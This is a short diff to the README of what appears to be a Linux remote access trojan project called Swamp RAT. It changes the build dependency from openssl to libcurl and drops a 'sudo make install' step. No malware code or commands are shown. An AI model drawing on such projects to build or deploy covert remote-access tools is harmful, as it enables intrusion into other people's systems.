@@ -16,12 +16,11 @@ A `linux` RAT that lurks where others do not.
 I started this as most free `linux` RATs are done half hazardly in higher level languages.
 
 # Dependancies
-- [`openssl`](https://www.openssl.org/) - libssl-dev
+- [`libcurl`](https://curl.haxx.se/libcurl/) - libcurl
 
 # Building Swamp RAT
 ```bash
 make
-sudo make install
 ```
 
 # TODO
